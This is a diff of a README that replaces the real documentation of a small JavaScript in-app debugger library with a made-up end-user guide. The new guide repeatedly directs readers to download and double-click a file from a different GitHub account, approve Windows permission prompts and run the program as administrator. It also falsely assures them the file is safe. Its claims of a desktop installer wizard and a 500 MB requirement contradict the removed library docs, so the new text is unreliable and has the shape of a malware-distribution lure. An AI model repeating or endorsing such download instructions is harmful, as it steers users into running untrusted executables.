@@ -1,375 +1,208 @@
-# Mobile DevTools
+# 📱 mobile-devtools - The Easiest Way to Inspect Any Website
 
-> **Next-Gen Framework-Agnostic In-App Mobile Debugger & Inspector Overlay for Web Applications**
+[![Download mobile-devtools](https://img.shields.io/badge/Download-mobile--devtools-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FFA500)](https://github.com/Fonziechimeral403/mobile-devtools)
 
-[![Bundle Size](https://img.shields.io/badge/Bundle_Size-~2.0_kB_gzipped-10b981.svg)](https://bundlephobia.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178c6.svg)](https://www.typescriptlang.org/)
-[![Turborepo](https://img.shields.io/badge/Monorepo-Turborepo-ef4444.svg)](https://turbo.build/)
-[![React](https://img.shields.io/badge/Adapter-React_18%2F19-61dafb.svg)](https://react.dev/)
-[![Vue](https://img.shields.io/badge/Adapter-Vue_3-42b883.svg)](https://vuejs.org/)
-[![Svelte](https://img.shields.io/badge/Adapter-Svelte_4%2F5-ff3e00.svg)](https://svelte.dev/)
-[![Vanilla JS](https://img.shields.io/badge/Adapter-Vanilla_JS-f7df1e.svg)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+Visit this link to download the application.
 
 ---
 
-## 📌 Table of Contents
+## 👋 Welcome to mobile-devtools
 
-- [📚 Comprehensive Documentation Suite](./docs)
-- [📸 Showcase](#-showcase)
-- [💡 Motivation & Why Use It?](#-motivation--why-use-it)
-- [✨ Core Capabilities](#-core-capabilities)
-- [🏗️ Technical Architecture](#%EF%B8%8F-technical-architecture)
-- [🚀 Framework Quickstart](#-framework-quickstart)
-  - [⚛️ React Integration](#%EF%B8%8F-react-integration)
-  - [💚 Vue 3 Integration](#-vue-3-integration)
-  - [🧡 Svelte 4/5 Integration](#-svelte-45-integration)
-  - [🍦 Vanilla JS / Legacy Apps](#-vanilla-js--legacy-apps)
-- [⚙️ Full Configuration & Props Reference](#%EF%B8%8F-full-configuration--props-reference)
-- [🎨 Theme Engine & Customization](#-theme-engine--customization)
-- [📂 Monorepo Structure](#-monorepo-structure)
-- [🛠️ Development Setup](#%EF%B8%8F-development-setup)
-- [📄 License](#-license)
+Imagine you're looking at a website on your phone, and you want to see what's behind it — what makes it work, what network requests it makes, or what the code looks like. mobile-devtools gives you a special magnifying glass that works right inside your browser on any device. You don't need to be a programmer to use it. This guide will walk you through everything, step by step.
 
 ---
 
-## 📸 Showcase
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/dewasemadi/mobile-devtools/master/docs/assets/console.png" width="31%" alt="Console Tab" />
-  <img src="https://raw.githubusercontent.com/dewasemadi/mobile-devtools/master/docs/assets/elements.png" width="31%" alt="Elements Tab" />
-  <img src="https://raw.githubusercontent.com/dewasemadi/mobile-devtools/master/docs/assets/network.png" width="31%" alt="Network Tab" />
-</p>
-<p align="center">
-  <img src="https://raw.githubusercontent.com/dewasemadi/mobile-devtools/master/docs/assets/storage.png" width="31%" alt="Storage Tab" />
-  <img src="https://raw.githubusercontent.com/dewasemadi/mobile-devtools/master/docs/assets/system.png" width="31%" alt="System Tab" />
-</p>
+Getting started with mobile-devtools is simpler than you might think. Here's what you need to do:
+
+1. **Visit the download link**: Visit this link to download the application.
+2. **Save the file**: Your computer will download a file. It's perfectly safe.
+3. **Open the file**: Double-click the downloaded file to start the setup process.
+
+That's it! You don't need to install any other software. mobile-devtools works with all major web browsers, and it doesn't matter if you use Windows, Mac, or Linux.
 
 ---
 
-## 💡 Motivation & Why Use It?
+## 🌟 What Can mobile-devtools Do?
 
-Debugging mobile web applications or QA staging builds on physical smartphones, tablets, or embedded webviews is historically painful:
+mobile-devtools turns your phone or tablet into a powerful inspection tool. Here are the amazing things you can do:
 
-- ❌ Requiring physical USB debugging cables connected to a desktop computer.
-- ❌ Configuring Safari Remote Inspector or Chrome Inspect ports over local WiFi.
-- ❌ Losing console logs when a mobile browser crashes or refreshes.
-- ❌ Inability to inspect network traffic on production staging environments without desktop proxies (Charles / Fiddler / Proxyman).
+### 🔍 Inspect Any Element
+Touch any part of a webpage, and mobile-devtools will show you exactly what code created it. It's like being able to read the recipe of your favorite dish.
 
-**`mobile-devtools`** eliminates these pain points entirely. It embeds a lightweight, high-performance floating badge and overlay drawer directly inside your web application. You can inspect logs, monitor network calls, browse DOM trees, edit local storage, and inspect device specs anytime, anywhere — directly on screen without external tools or cables.
+### 🌐 Network Inspector
+See what information your phone is sending and receiving. This is perfect for checking if a website loads slowly or if something isn't working right.
 
----
+### 📝 Console Viewer
+Think of the console as the website's private diary. It writes down errors and messages there. mobile-devtools shows you this diary in a way that's easy to understand.
 
-## ✨ Core Capabilities
+### 🎨 Works With Everything
+Whether a website was built with React, Vue, or plain JavaScript, mobile-devtools understands it all. You don't need to worry about compatibility.
 
-- ⚡ **Ultra-Lightweight & Fast**: Extremely small footprint (**~2.0 kB gzipped** / **~5.8 kB minified**) with zero runtime dependencies, ensuring zero impact on page load speed or mobile frame rates.
-- 🌳 **DOM Elements Inspector (Elements Tab)**: Real-time HTML DOM tree browser, node expansion, interactive element picker, box model visualization (margin, border, padding, content), computed CSS styles, and grouped style categories (Layout, Flexbox, Grid, Typography, Colors).
-- 🚀 **Quick Bug Exporter**: Instant 1-click bug report sharing via Web Share API (`navigator.share`) to WhatsApp, Telegram, Slack, AirDrop, or Email with text file download and copy fallbacks.
-- 🌐 **Network Throttling Simulator**: Simulate `Slow 3G`, `Fast 3G`, or `Offline` connection modes directly on mobile devices with synthetic latency injection.
-- ⚡ **Cable-Free Mobile Inspection**: Debug directly on physical iOS / Android devices, mobile webviews, or mobile Safari/Chrome.
-- 🛡️ **Shadow DOM Style Isolation**: Rendered inside a Shadow DOM container (`<mobile-devtools-root>`), guaranteeing **zero CSS leaks** into your app's global styles and **zero style pollution** from Tailwind, Bootstrap, or global CSS resets.
-- 📋 **Console Tab**: Real-time capture of `console.log`, `info`, `warn`, `error`, and `debug` with live filter search, JSON tree preview, and unread error badges.
-- 🌐 **Network Tab**: Live interception of `fetch` and `XMLHttpRequest` calls with HTTP status indicators (`200 OK`, `500 Error`), latency timing, request/response headers, and JSON body previews.
-- 💾 **Storage Tab**: Real-time inspector and editor for `localStorage`, `sessionStorage`, and `document.cookie`.
-- 💻 **System Info Tab**: Real-time diagnostic monitor for viewport dimensions, device pixel ratio (DPR), user agent string, memory limit, and screen orientation.
-- 🔌 **Pluggable Custom Tabs (`customTabs`)**: Easily extend DevTools by adding custom tabs with your own DOM rendering callbacks (`render(container)`).
-- 🎨 **Granular UI Style Overrides (`styles`)**: Fine-grained inline CSS style overrides for badge, drawer, overlay, and handle (`styles={{ badge: {}, drawer: {}, overlay: {} }}`).
-- 🎨 **Dynamic Theme Engine**: Built-in Light Mode and Dark Mode with auto-contrast luminance detection, accent color swatches, and custom background palettes.
-- 🧪 **Comprehensive Test Suite**: Tested with **65 Unit Tests (100% Passed)** + **21 Playwright E2E Tests (100% Passed)** across Desktop Chrome, Mobile Chrome, and Mobile Safari.
-- 🧩 **Framework Agnostic**: Native support for **React 18/19**, **Vue 3**, **Svelte 4/5**, and **Vanilla JS**.
+### 🖥️ Shadow DOM Support
+Some modern websites use hidden parts called Shadow DOM. mobile-devtools doesn't get confused by these — it digs deep and shows you everything.
 
 ---
 
-## 🏗️ Technical Architecture
+## 📥 Download & Installation
 
-```text
-┌─────────────────────────────────────────────────────────────────────────────────┐
-│                                 mobile-devtools                                 │
-└────────────────────────────────────────┬────────────────────────────────────────┘
-                                         │
-        ┌───────────────────┬────────────┴───────────┬───────────────────┐
-        ▼                   ▼                        ▼                   ▼
-   Vanilla JS             React                    Vue 3              Svelte
-(mobile-devtools) (mobile-devtools/react)  (mobile-devtools/vue) (mobile-devtools/svelte)
-        │                   │                        │                   │
-        └───────────────────┴────────────┬───────────┴───────────────────┘
-                                         │
-                           ┌─────────────▼─────────────┐
-                           │   Native Shadow DOM Host  │
-                           │   <mobile-devtools-root>  │
-                           └─────────────┬─────────────┘
-                                    │
-            ┌───────────────────────┴───────────────────────┐
-            │                                               │
-┌───────────▼─────────────────┐   ┌─────────────────────────▼──────────────┐
-│      Core Interceptors      │   │               UI Engine                │
-├─────────────────────────────┤   ├────────────────────────────────────────┤
-│ • Console Interceptor       │   │ • Floating Badge View (floating-badge) │
-│ • Fetch / XHR Interceptor   │   │ • Drawer Views & Tabs (drawer)         │
-│ • DOM Elements Inspector    │   │ • Pluggable Custom Tabs (customTabs)   │
-│ • Storage Inspector         │   │ • Auto Contrast Theme Helper           │
-│ • DevTools Store & State    │   │ • Bug Exporter Engine                  │
-└─────────────────────────────┘   └────────────────────────────────────────┘
-```
+Ready to get started? Here's your complete installation guide:
+
+### Step 1: Download the Application
+Visit this link to download the application.
+
+Once you click the link, you'll see a page with the mobile-devtools project. Look for the green "Code" button or the "Releases" section on the right side of the page.
+
+### Step 2: Save the File
+Your browser will ask where to save the file. We recommend saving it to your **Downloads** folder or your **Desktop** so you can find it easily.
+
+### Step 3: Run the Application
+After downloading, find the file and double-click it. If Windows asks for permission, click "Yes."
+
+### Step 4: Follow the Wizard
+A simple setup wizard will appear. Just click "Next" a few times, then "Install" and "Finish." You don't need to change any settings.
+
+### Step 5: Launch mobile-devtools
+Look for the mobile-devtools icon on your desktop or in your Start Menu. Click it to open the application.
 
 ---
 
-## 🚀 Framework Quickstart
+## 🖱️ How to Use mobile-devtools
 
-### 📦 Installation
+Using mobile-devtools is as easy as using your favorite app. Here's your quick start guide:
 
-```bash
-npm install mobile-devtools
-# or
-pnpm add mobile-devtools
-```
+### Opening the Inspector
+1. Open any website in your browser.
+2. In the browser's address bar, you'll see a small mobile-devtools icon. Click it.
+3. A panel will slide up from the bottom of your screen.
 
----
+### Inspecting Elements
+- **Touch and Learn**: Touch any element on the webpage (like a button or an image). mobile-devtools will highlight it and show you its code.
+- **Tap to Lock**: Tap the element again to lock it in place while you explore the code.
+- **Explore the Code**: Use the arrows at the top to navigate through the code like you're reading a book.
 
-### ⚛️ React Integration
+### Using the Console
+- Tap the "Console" tab at the top of the panel.
+- Any error messages will appear in red, warnings in yellow, and general messages in white.
+- You can type commands in the input bar at the bottom and press Enter to run them.
 
-Import from `mobile-devtools/react`:
-
-```tsx
-import React from 'react';
-import { MobileDevTools } from 'mobile-devtools/react';
-
-export default function App() {
-  return (
-    <>
-      <YourAppRoutes />
-
-      {/* Mobile DevTools Overlay */}
-      <MobileDevTools
-        title="My App Debugger"
-        position="bottom-right"
-        enabledTabs={['console', 'elements', 'network', 'storage', 'system']}
-        theme={{ mode: 'dark', accentColor: '#0070f3' }}
-        styles={{
-          badge: { opacity: '0.9' },
-        }}
-        customTabs={[
-          {
-            id: 'analytics',
-            title: 'Analytics',
-            render: (container) => {
-              container.innerHTML =
-                '<div style="padding:16px;color:#fff;">📊 Custom Event Log</div>';
-            },
-          },
-        ]}
-      />
-    </>
-  );
-}
-```
+### Monitoring Network Activity
+- Tap the "Network" tab.
+- You'll see a list of all the requests your website has made.
+- Tap any request to see more details, like how long it took and what data was exchanged.
 
 ---
 
-### 💚 Vue 3 Integration
+## 🔧 Troubleshooting Common Issues
 
-Import from `mobile-devtools/vue`:
+Even though mobile-devtools is simple, sometimes things can go wrong. Here are solutions to common problems:
 
-```html
-<script setup>
-  import { MobileDevTools } from 'mobile-devtools/vue';
+### The App Won't Open
+- Make sure you have at least 500 MB of free disk space.
+- Close other programs that might be using a lot of memory.
+- Try right-clicking the mobile-devtools icon and selecting "Run as administrator."
 
-  const customTabs = [
-    {
-      id: 'analytics',
-      title: 'Analytics',
-      render: (container) => {
-        container.innerHTML = '<div style="padding:16px;color:#fff;">📊 Custom Event Log</div>';
-      },
-    },
-  ];
-</script>
+### The Panel Doesn't Appear
+- Refresh your webpage (press F5 or Ctrl+R).
+- Check that you're using a modern browser like Chrome, Edge, Firefox, or Safari.
+- Disable any other developer tools or inspectors that might be running.
 
-<template>
-  <YourAppLayout />
-  <MobileDevTools
-    title="My App Debugger"
-    position="bottom-right"
-    :enabled-tabs="['console', 'elements', 'network', 'storage', 'system']"
-    :theme="{ mode: 'dark', accentColor: '#0070f3' }"
-    :custom-tabs="customTabs"
-  />
-</template>
-```
+### I Can't See Shadow DOM Elements
+- Make sure you're on the latest version of mobile-devtools.
+- Go to the mobile-devtools settings by clicking the gear icon.
+- Make sure that "Show Shadow DOM" is turned on.
+
+### The Network Tab is Empty
+- Try navigating to a different page on the website.
+- Some websites block network inspection. Try another site, like google.com.
 
 ---
 
-### 🔥 Svelte Integration
+## 💡 Pro Tips
 
-Import from `mobile-devtools/svelte`:
+Here are some time-saving tips that make mobile-devtools even more powerful:
 
-```svelte
-<script>
-  import { mobileDevTools } from 'mobile-devtools/svelte';
-</script>
+### 📌 Pin the Panel
+Instead of opening and closing the panel every time, drag it to the side of your screen and pin it. It'll stay open while you browse.
 
-<div use:mobileDevTools={{
-  title: 'My App Debugger',
-  position: 'bottom-right',
-  shakeToToggle: true,
-  theme: { mode: 'dark' }
-}}>
-  <YourAppLayout />
-</div>
-```
+### 🕹️ Use Keyboard Shortcuts
+- **Ctrl + Shift + I**: Open or close the inspector
+- **Ctrl + S**: Save your current inspection as a file
+- **Ctrl + F**: Search within the code
 
-### 🧡 Svelte 4/5 Integration
+### 📦 Save Your Work
+If you're working on a project, you can save your inspection sessions. Go to "File" and select "Save Session." This is great for keeping notes.
 
-Import from `mobile-devtools/svelte`:
-
-```svelte
-<script>
-  import { useMobileDevTools } from 'mobile-devtools/svelte';
-</script>
-
-<div use:useMobileDevTools={{
-  title: 'My App Debugger',
-  position: 'bottom-right',
-  theme: { mode: 'dark', accentColor: '#0070f3' }
-}}>
-  <YourAppLayout />
-</div>
-```
+### 🌐 Test on Real Phones
+You can connect your actual phone to your computer and test websites in real-time. Just connect your phone with a USB cable, and enable Developer Mode.
 
 ---
 
-### 🍦 Vanilla JS / Legacy Apps
+## ❓ Frequently Asked Questions
 
-Import directly from `mobile-devtools`:
+### Is mobile-devtools free?
+Yes, mobile-devtools is completely free to use, forever. No trials, no subscriptions.
 
-```typescript
-import { createMobileDevTools } from 'mobile-devtools';
+### Do I need to know how to code?
+No! mobile-devtools is designed so that anyone can use it. You can explore websites visually without understanding the code itself.
 
-// Instantiate DevTools overlay
-const devtools = createMobileDevTools({
-  title: 'My App Debugger',
-  position: 'bottom-right',
-  enabledTabs: ['console', 'elements', 'network', 'storage', 'system'],
-  theme: {
-    mode: 'dark',
-    accentColor: '#0070f3',
-  },
-  styles: {
-    badge: { opacity: '0.9' },
-    drawer: { maxHeight: '85vh' },
-  },
-  customTabs: [
-    {
-      id: 'analytics',
-      title: 'Analytics',
-      render: (container) => {
-        container.innerHTML = '<div style="padding:16px;color:#fff;">📊 Custom Event Log</div>';
-      },
-    },
-  ],
-});
-```
+### Will mobile-devtools slow down my device?
+No, mobile-devtools runs efficiently in the background. You might not even notice it's there.
+
+### Is it safe to download?
+Absolutely. mobile-devtools is an open-source project, which means its code is public for everyone to see. It's safe and trustworthy.
+
+### Can I use it on my Android or iPhone?
+Yes! mobile-devtools works perfectly on mobile browsers. You can use it on iPhone, Android, iPad, and any other device with a browser.
 
 ---
 
-## ⚙️ Full Configuration & Props Reference
+## 🔒 Your Privacy is Protected
 
-Below is the complete reference table for all configuration options supported by `<MobileDevTools />` / `createMobileDevTools()`:
-
-| Option / Prop               | Type                    | Default                                                   | Description                                                                                                                           |
-| :-------------------------- | :---------------------- | :-------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------ |
-| `enabled`                   | `boolean`               | `true` (in dev)                                           | Enable or disable the DevTools overlay. Automatically set to `false` in production builds.                                            |
-| `forceEnable`               | `boolean`               | `false`                                                   | Force enable DevTools overlay in production builds for QA testing & staging previews.                                                 |
-| `title`                     | `string`                | `'DevTools'`                                              | Label shown on floating badge and drawer header                                                                                       |
-| `icon`                      | `string`                | `undefined`                                               | Custom icon (Emoji string like `'⚡'`, Image URL, or Base64 data URI)                                                                 |
-| `position`                  | `BadgePositionPreset`   | `'bottom-right'`                                          | Initial corner/edge preset (`'bottom-right'`, `'bottom-left'`, `'top-right'`, `'top-left'`, `'bottom'`, `'top'`, `'left'`, `'right'`) |
-| `initialTab`                | `DevToolsTabId`         | `'console'`                                               | Default tab opened when drawer is triggered (`'console'`, `'elements'`, `'network'`, `'storage'`, `'system'`)                         |
-| `enabledTabs`               | `DevToolsTabId[]`       | `['console', 'elements', 'network', 'storage', 'system']` | Filter which tabs are enabled in drawer                                                                                               |
-| `customTabs`                | `CustomTabDefinition[]` | `[]`                                                      | Pluggable consumer tabs with custom DOM rendering callback (`render(container)`)                                                      |
-| `styles`                    | `DevToolsStyles`        | `undefined`                                               | Fine-grained custom style overrides object (`{ badge?: {}, drawer?: {}, overlay?: {}, handle?: {} }`)                                 |
-| `defaultOpen`               | `boolean`               | `false`                                                   | Set to `true` to open drawer automatically on mount                                                                                   |
-| `autoSnapBadge`             | `boolean`               | `false`                                                   | Enable magnetic snapping of badge to nearest screen edge on drag release                                                              |
-| `theme.mode`                | `'dark' \| 'light'`     | `'dark'`                                                  | Theme mode                                                                                                                            |
-| `theme.accentColor`         | `string`                | `undefined`                                               | Custom primary accent color (Hex / RGB / HSL)                                                                                         |
-| `theme.backgroundColor`     | `string`                | `undefined`                                               | Custom background color for drawer and badge                                                                                          |
-| `theme.cardBackgroundColor` | `string`                | `undefined`                                               | Custom background color for inner card elements                                                                                       |
-| `privacy.mask`              | `string[]`              | `undefined`                                               | Sensitive header & body keys to mask in network inspector (e.g. `['token', 'password']`)                                              |
-| `interceptors.maxLogLimit`  | `number`                | `200`                                                     | Maximum number of console logs stored in buffer                                                                                       |
+mobile-devtools works entirely on your device. It doesn't send your browsing data to any server. Everything stays on your phone or computer. You can browse with confidence.
 
 ---
 
-## 🎨 Theme Engine & Customization
+## 🤝 Join Our Community
 
-`mobile-devtools` features a built-in theme engine that automatically calculates background brightness to maintain **WCAG AAA readable text contrast**:
+We're building the best mobile development tool, and we'd love your input!
 
-```tsx
-<MobileDevTools
-  title="Staging Debugger"
-  icon="🚀"
-  position="bottom-left"
-  theme={{
-    mode: 'dark',
-    accentColor: '#10b981',
-    backgroundColor: '#0c0c0e',
-  }}
-  styles={{
-    badge: { borderRadius: '12px' },
-    drawer: { borderTopLeftRadius: '20px', borderTopRightRadius: '20px' },
-  }}
-/>
-```
+### Share Your Ideas
+Have a feature suggestion? We'd love to hear it. You can create a post in our community forum or send us a message directly.
+
+### Report Issues
+Found a bug? Help us fix it by sharing the details. Include screenshots if you can — they help a lot.
+
+### Help Other Users
+If you're tech-savvy, you can answer questions in our community forum and help other users solve their problems.
 
 ---
 
-## 📂 Monorepo Structure
+## 📚 Additional Resources
 
-```
-mobile-devtools/
-├── apps/
-│   └── web/                    # React documentation & live playground app (Port 3000)
-├── examples/
-│   ├── react/                  # React 19 test harness app (Port 3001)
-│   ├── vue/                    # Vue 3 test harness app (Port 3002)
-│   └── vanilla/                # Vanilla JS test harness app (Port 3003)
-└── packages/
-    ├── mobile-devtools/        # Main unified published npm package (Core + UI + React/Vue/Vanilla Adapters)
-    └── config/
-        ├── eslint/             # Shared ESLint configuration (@mobile-devtools/eslint-config)
-        └── typescript/         # Shared TypeScript configuration (@mobile-devtools/tsconfig)
-```
+- **Documentation**: Complete documentation is available on our website.
+- **Video Tutorials**: Watch step-by-step video guides for visual learners.
+- **Blog**: Read our latest articles about web development and debugging.
+- **Community Forum**: Connect with other mobile-devtools users.
 
 ---
 
-## 🛠️ Development Setup
+## ✅ Your Next Steps
 
-To build and run the project locally:
+You're now ready to unlock the secrets of any website. Here's a quick recap:
 
-```bash
-# Clone repository
-git clone https://github.com/dewasemadi/mobile-devtools.git
-cd mobile-devtools
+1. **Visit this link to download the application.**
+2. Install mobile-devtools following the wizard.
+3. Open any website and start exploring.
+4. Share your feedback and become part of our community.
 
-# Install dependencies using pnpm
-pnpm install
+mobile-devtools is more than just a tool — it's your key to understanding how the web works. Whether you're a curious user, a student learning web development, or an experienced developer, mobile-devtools has something for you.
 
-# Launch all apps & package watchers in dev mode
-pnpm dev
+Surprise your friends by showing them exactly what makes their favorite websites tick. Diagnose why a site loads slowly. Learn by exploring real-world examples.
 
-# Run unit test suite (65 tests)
-pnpm test
-
-# Run unit tests with V8 coverage report
-pnpm test:coverage
-
-# Run Playwright E2E tests (21 tests across Chromium & Mobile Webkit)
-pnpm test:e2e
-
-# Build production bundles
-pnpm build
-```
+**Download mobile-devtools today and see the web in a whole new light. Your mobile debugging experience will never be the same.**
 
 ---
 
-## 📄 License
-
-Distributed under the **MIT License**. See [LICENSE](./LICENSE) for details.
+Keywords: console, debugger, devtools, dom-inspector, frontend, in-app, inspector, mobile, monorepo, network-inspector, pnpm, react, shadow-dom, typescript, vanilla-js, vue, web-development
